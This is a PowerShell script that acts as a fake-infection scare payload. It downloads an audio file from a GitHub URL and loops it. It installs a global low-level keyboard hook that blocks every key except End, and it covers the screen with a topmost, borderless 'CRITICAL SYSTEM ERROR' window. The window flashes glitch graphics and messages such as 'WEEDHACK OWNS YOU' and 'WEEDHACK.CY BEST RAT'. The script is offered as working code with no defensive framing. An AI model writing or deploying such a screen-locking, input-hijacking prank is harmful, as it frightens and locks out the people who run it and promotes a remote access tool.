Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Download audio FIRST before anything else
$audioUrl = "https://github.com/Star2likesgirls/powershell/raw/refs/heads/main/beat.wav"
$tempAudioPath = [System.IO.Path]::Combine($env:TEMP, "virus_beat.wav")

Write-Host "Downloading audio..."
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
(New-Object System.Net.WebClient).DownloadFile($audioUrl, $tempAudioPath)
Write-Host "Audio downloaded successfully!"

# Start playing audio immediately
$audioPlayer = New-Object System.Media.SoundPlayer
$audioPlayer.SoundLocation = $tempAudioPath
$audioPlayer.Load()
$audioPlayer.PlayLooping()
Write-Host "Audio is now playing in loop!"

# Keyboard hook to block all keys except End
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyboardHook {
    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("user32.dll")]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

# Create form
$form = New-Object System.Windows.Forms.Form
$form.Text = "CRITICAL SYSTEM ERROR"
$form.WindowState = "Maximized"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::Black
$form.TopMost = $true
$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

# Global variables
$script:counter = 0
$script:audioPlayer = $null

# Install keyboard hook
$hookProc = [KeyboardHook+HookProc] {
    param($nCode, $wParam, $lParam)
    
    if ($nCode -ge 0) {
        $vkCode = [Runtime.InteropServices.Marshal]::ReadInt32($lParam)
        # Block everything except End key (35) and allow our hook to be removed
        if ($vkCode -ne 35) {
            return [IntPtr]1  # Block the key
        }
    }
    return [KeyboardHook]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
}

$script:hookPtr = [KeyboardHook]::SetWindowsHookEx(13, $hookProc, [IntPtr]::Zero, 0)

# Paint event handler
$form.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $width = $form.ClientSize.Width
    $height = $form.ClientSize.Height
    
    # Effect 1: Intense melting screen
    for ($i = 0; $i -lt 40; $i++) {
        $x = Get-Random -Minimum 0 -Maximum $width
        $y = Get-Random -Minimum 0 -Maximum $height
        $w = Get-Random -Minimum 30 -Maximum 150
        $h = Get-Random -Minimum 10 -Maximum 50
        $color = [System.Drawing.Color]::FromArgb(
            (Get-Random -Minimum 0 -Maximum 255),
            (Get-Random -Minimum 0 -Maximum 255),
            (Get-Random -Minimum 0 -Maximum 255)
        )
        $brush = New-Object System.Drawing.SolidBrush($color)
        $g.FillRectangle($brush, $x, $y, $w, $h)
        $brush.Dispose()
    }
    
    # Effect 2: Dense matrix rain
    $font = New-Object System.Drawing.Font("Consolas", 16)
    for ($i = 0; $i -lt 80; $i++) {
        $x = ($i * 20) % $width
        $y = (($script:counter * 3 + $i * 30) % ($height + 200))
        $char = [char](Get-Random -Minimum 33 -Maximum 126)
        $greenVal = Get-Random -Minimum 150 -Maximum 255
        $color = [System.Drawing.Color]::FromArgb($greenVal, 255, $greenVal)
        $brush = New-Object System.Drawing.SolidBrush($color)
        $g.DrawString($char, $font, $brush, $x, $y)
        $brush.Dispose()
    }
    $font.Dispose()
    
    # Effect 3: Chaotic psychedelic circles
    for ($i = 0; $i -lt 25; $i++) {
        $cx = $width / 2 + [Math]::Cos($script:counter * 0.03 + $i) * ($width * 0.35)
        $cy = $height / 2 + [Math]::Sin($script:counter * 0.025 + $i) * ($height * 0.35)
        $radius = 40 + [Math]::Sin($script:counter * 0.08 + $i) * 30
        $color = [System.Drawing.Color]::FromArgb(
            180,
            [int](128 + [Math]::Sin($script:counter * 0.04 + $i) * 127),
            [int](128 + [Math]::Cos($script:counter * 0.05 + $i) * 127),
            [int](128 + [Math]::Sin($script:counter * 0.06 + $i) * 127)
        )
        $brush = New-Object System.Drawing.SolidBrush($color)
        $g.FillEllipse($brush, $cx - $radius, $cy - $radius, $radius * 2, $radius * 2)
        $brush.Dispose()
    }
    
    # Effect 4: Intense glitch lines
    for ($i = 0; $i -lt 80; $i++) {
        $y = Get-Random -Minimum 0 -Maximum $height
        $color = [System.Drawing.Color]::FromArgb(
            120,
            (Get-Random -Minimum 0 -Maximum 255),
            (Get-Random -Minimum 0 -Maximum 255),
            (Get-Random -Minimum 0 -Maximum 255)
        )
        $pen = New-Object System.Drawing.Pen($color, 3)
        $g.DrawLine($pen, 0, $y, $width, $y)
        $pen.Dispose()
    }
    
    # Effect 5: Multiple bouncing error messages
    $warnFont = New-Object System.Drawing.Font("Courier New", 48, [System.Drawing.FontStyle]::Bold)
    
    $messages = @(
        "WEEDHACK IS IN YOUR SYSTEM",
        "CRITICAL FAILURE", 
        "WEEDHACK OWNS YOU",
        "WEEDHACK.CY BEST RAT"
    )
    
    for ($i = 0; $i -lt $messages.Length; $i++) {
        $x = [Math]::Abs([Math]::Sin($script:counter * 0.04 + $i)) * ($width - 700)
        $y = [Math]::Abs([Math]::Cos($script:counter * 0.035 + $i * 1.5)) * ($height - 100)
        
        $colors = @([System.Drawing.Color]::Red, [System.Drawing.Color]::Yellow, 
                   [System.Drawing.Color]::Magenta, [System.Drawing.Color]::Cyan)
        $brush = New-Object System.Drawing.SolidBrush($colors[$i])
        $g.DrawString($messages[$i], $warnFont, $brush, $x, $y)
        $brush.Dispose()
    }
    $warnFont.Dispose()
    
    # Pulsing scanlines
    for ($i = 0; $i -lt $height; $i += 4) {
        $alpha = [int](30 + [Math]::Sin($script:counter * 0.1 + $i * 0.01) * 20)
        $color = [System.Drawing.Color]::FromArgb($alpha, 255, 255, 255)
        $pen = New-Object System.Drawing.Pen($color, 1)
        $g.DrawLine($pen, 0, $i, $width, $i)
        $pen.Dispose()
    }
    
    # Draw exit info
    $infoFont = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
    $infoBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $shadowBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Black)
    $info = ">>> PRESS END KEY TO TERMINATE <<<"
    $g.DrawString($info, $infoFont, $shadowBrush, 22, $height - 42)
    $g.DrawString($info, $infoFont, $infoBrush, 20, $height - 40)
    $infoFont.Dispose()
    $infoBrush.Dispose()
    $shadowBrush.Dispose()
})

# Timer for animation
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 30  # Faster refresh for more intensity
$timer.Add_Tick({
    $script:counter++
    $form.Invalidate()
})

# Keyboard handler
$form.Add_KeyDown({
    param($sender, $e)
    if ($e.KeyCode -eq "End") {
        # Stop audio
        $audioPlayer.Stop()
        $audioPlayer.Dispose()
        
        # Unhook keyboard
        if ($script:hookPtr -ne [IntPtr]::Zero) {
            [KeyboardHook]::UnhookWindowsHookEx($script:hookPtr)
        }
        $timer.Stop()
        $form.Close()
    }
})

# Form closing cleanup
$form.Add_FormClosing({
    $audioPlayer.Stop()
    $audioPlayer.Dispose()
    if ($script:hookPtr -ne [IntPtr]::Zero) {
        [KeyboardHook]::UnhookWindowsHookEx($script:hookPtr)
    }
})

# Start everything
$timer.Start()
[void]$form.ShowDialog()

# Cleanup
$timer.Dispose()
$form.Dispose()
